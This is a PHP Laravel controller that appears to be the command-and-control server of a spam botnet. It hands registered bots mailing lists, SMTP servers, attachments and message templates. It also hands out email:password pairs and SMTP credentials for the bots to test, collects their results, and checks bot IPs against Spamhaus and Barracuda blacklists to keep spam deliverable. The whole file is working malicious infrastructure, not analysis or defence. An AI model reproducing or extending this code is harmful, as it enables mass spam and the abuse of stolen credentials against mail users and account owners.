<?php

namespace App\Http\Controllers;

use App\Bots;
use App\ControlMailList;
use App\FindSmtpSettings;
use App\MailSettings;
use App\PannelSettings;
use App\SettingsForCheckSMTP;
use App\SMTP;
use App\smtpfindpiece;
use App\smtplistpiece;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;

class CommandController extends Controller
{
    public function index(Request $request)
    {
        $ip = $this->getRealIP();
        $bot = Bots::where(['ip' => $ip])->first();
        $statusAdmin = PannelSettings::whereId(1)->first();

        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
        } else {
            abort(404);
        }

        if ($statusAdmin->checkBlackList != 'noNeedCheckBlack') {
            if (!isset($bot->blacklistdate)) {
                if ($this->IpBlackListTest($ip) > 0) {
                    $bot->black = 1;
                    $bot->blacklistdate = Carbon::now('Europe/Kiev');
                    $bot->save();
                    echo '0';
                    exit();
                } else {
                    $bot->black = 0;
                    $bot->blacklistdate = Carbon::now('Europe/Kiev');
                    $bot->save();
                }
            } else {
                if (Carbon::parse($bot->blacklistdate, 'Europe/Kiev')->diffInHours(Carbon::now('Europe/Kiev')) > 0) {
                    if ($this->IpBlackListTest($ip) > 0) {
                        $bot->black = 1;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                        echo '0';
                        exit();
                    } else {
                        $bot->black = 0;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                    }
                } else {
                    if (isset($bot->ban) && $bot->ban) {
                        echo '0';
                        exit();
                    }
                }
            }
        }

        if ($statusAdmin->status == 'SPAM') {

            $result = [];

            $settings = MailSettings::find(1);

            $result[] = '3';
            $result[] = $settings->thread_count;

            $smtp = SMTP::orderByRaw("RAND()")->take($settings->smtp_count)->get();
            $string = "";

            foreach ($smtp as $item) {
                $string .= $item->domen . "\t";
            }

            $result[] = $string;
            try {
                $files = scandir(storage_path('app') . '/' . config('config.emails.mails'));
                if (File::exists(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2])) {
                    $filename = "botid-" . $bot->id . "-file" . time('U') . '.txt';
                    copy(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2], storage_path('app') . '/' . config('config.emails.go_mails') . '/' . $filename);
                    unlink(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2]);
                    $result[] = url('download/go-mails/' . $filename);
                }else{
                    $result[] = "";
                }
            } catch (\Exception $e) {
                $result[] = "";
                echo 0;
                exit();
            }

            $files =  scandir(storage_path('app') . '/' . config('config.fromname'));
            if (count($files) > 2) {
                $result[] = url('download/' . $files[rand(2, count($files) - 1)]);
            } else {
                $result[] = "";
            }

            if ($settings->send_attach != 0) {
                $files =  scandir(storage_path('app') . '/' . config('config.attach'));
                if (count($files) > 2) {
                    $result[] = url('download/' . $files[rand(2, count($files) - 1)]);
                } else {
                    $result[] = "";
                }
            }

            $result[] = $settings->attach_name_macros;
            $result[] = $settings->x_mailer;
            $result[] = "macro1=" . $settings->macros1 . "\t" . "macro2=" . $settings->macros2 . "\t" . "macro3=" . $settings->macros3;
            $result[] = $settings->emails_from_server;
            $result[] = $settings->message_theme;
            $result[] = $settings->message_text;
            echo implode(PHP_EOL, $result);
            $bot->bot_status = 1;
            $bot->otk = 0;
            $bot->life = 1;
            $bot->time = Carbon::now('Europe/Kiev');
            $bot->save();

        }

        if ($statusAdmin->status == 'SMTPCHECK') {

            $settingsSMTP = SettingsForCheckSMTP::find(1);

            $smtpListBotCount = smtplistpiece::where('botid', '<>', '')->select(DB::raw('count(distinct botid) as count'))->first();

            $settings = MailSettings::find(1);

            if (\intval($smtpListBotCount->count) <= $settingsSMTP->countbots) {

                if (smtplistpiece::where(['botid' => $bot->id])->first() == null) {

                    $smtp = smtplistpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();


                    if (count($smtp) < 1) {
                        echo 0;
                        exit();
                    }
                    echo "8\n";

                    echo $settingsSMTP->threads . "\n";

                    foreach ($smtp as $item) {
                        echo $item->smtp . "\t";
                        $item->isget = 1;
                        $item->time = Carbon::now('Europe/Kiev');
                        $item->botid = $bot->id;
                        $item->save();
                    }
                    echo "\n";

                    $controlMail = ControlMailList::orderByRaw('RAND()')->first();
                    echo $controlMail->mail . "\n";

                    echo $settingsSMTP->mark . "\n";

                    if ($settingsSMTP->includefile == 1) {
                        $files = Storage::allFiles(config('config.smtp_check_attach'));
                        echo url('download/' . $files[rand(0, count($files) - 1)]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    if ($settingsSMTP->mailText == 1) {
                        $files = Storage::allFiles(config('config.mailTextFile'));
                        echo url('download/' . $files[0]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    $files = Storage::allFiles(config('config.fromname'));
                    if (count($files) > 0) {
                        echo url('download/' . $files[rand(0, count($files) - 1)]);
                        echo "\n";
                    } else {
                        echo "\n";
                    }

                    echo $settings->x_mailer . "\n";
                } else {
                    echo 0;
                    exit();
                }
            } else {
                echo 0;
                exit();
            }
        }

        if ($statusAdmin->status == 'SMTPFIND') {
            $settingsSMTP = FindSmtpSettings::find(1);
            $list = smtpfindpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->count_emails)->get();
            if (count($list) > 0) {
                echo "2\n";
                echo $settingsSMTP->threads . "\n";
                foreach ($list as $item) {
                    $item->isget = 1;
                    echo $item->emailpas . "\t";
                    $item->time = Carbon::now('Europe/Kiev');
                    $item->botid = $bot->id;
                    $item->save();
                }
            } else {
                echo 0;
                exit();
            }
        }
    }

    function getRealIP()
    {
        if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            $ip = $_SERVER['HTTP_X_REAL_IP'];
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }

    function IpBlackListTest($ip)
    {
        $countBans = 0;
        $baracuda = "b.barracudacentral.org";
        $spamHaus = "zen.spamhaus.org";
        $abuseAt = "cbl.abuseat.org";
        $spamHaus2 = "xbl.spamhaus.org";

        $urlb = implode(".", array_reverse(explode(".", $ip))) . "." . $baracuda;
        $urls = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus;
        $urla = implode(".", array_reverse(explode(".", $ip))) . "." . $abuseAt;
        $urls2 = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus2;

        $record = dns_get_record($urlb);
        $countBans += count($record);
        $record = dns_get_record($urls);
        $countBans += count($record);
        $record = dns_get_record($urls2);
        $countBans += count($record);
        $record = dns_get_record($urla);
        $countBans += count($record);

        return $countBans;
    }

    public function sendcheckers(Request $request)
    {
        $set = SettingsForCheckSMTP::find(1);
        $result = trim($request->get('result'));

        $nosmtp = $sent = $saved = $bad = 0;
        if (isset($result) && strlen($result) > 3) {

            $resultArray = explode("\n", $result);
            $all = count($resultArray);
            foreach ($resultArray as $value) {
                $value = trim($value);
                if (empty($value)) {
                    continue;
                }

                $smtp = explode("!-!", $value)[0];
                $status = trim(explode("!-!", $value)[1]);

                $logFile = "";
                $status_err = "";

                if (strtoupper($status) == 'SENT') {
                    $sent++;
                    $logFile = "smtp_check_logs/" . $set['mark'] . "_good.txt";
                } else {
                    $bad++;
                    $logFile = "smtp_check_logs/" . $set['mark'] . "_bad.txt";
                    $status_err = trim(explode(':', $status, 2)[1]);
                    $status = trim(explode(':', $status, 2)[0]);
                }
                Storage::append($logFile, $value . "\r\n");

                $smtp = smtplistpiece::where(['smtp' => trim($smtp)])->first();
                if ($smtp != null) {
                    $saved++;
                    $smtp->botid = 0;
                    $smtp->isget = 1;
                    $smtp->time = '';
                    $smtp->status = strtoupper($status);
                    $smtp->errmsg = $status_err;
                    $smtp->save();
                } else {
                    $nosmtp++;
                }
            }
        }
    }

    public function smtpcheckres(Request $request)
    {
        $result = $request->get('result');

        $res = explode("\r\n", urldecode($result));

        foreach ($res as $item) {
            $r = explode('|', $item);
            if (count($r) > 3) {
                $mailpass = $r[2] . ":" . $r[3];
            } else {
                $t = explode("://", $item);
                if (count($t) < 2) {
                    continue;
                }
                $mailpass = $t[1];
            }

            $e = smtpfindpiece::where(['emailpas' => trim($mailpass)])->first();
            if ($e != null) {
                $e->status = urldecode($item);
                $e->isget = 1;
                $e->time = '';
                $e->save();
            }
        }
    }

    public function postIndex(Request $request)
    {
        $ip = $this->getRealIP();
        $bot = Bots::where(['ip' => $ip])->first();
        $status = $request->get('status');
        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
            $bot->bot_status = $status;
            $bot->life = 1;
            $bot->otk = 0;
            $bot->time = Carbon::now('Europe/Kiev');
            $bot->save();
        } else {
            Bots::create([
                'ip' => $ip,
                'time' => Carbon::now('Europe/Kiev'),
            ]);
        }
    }

}
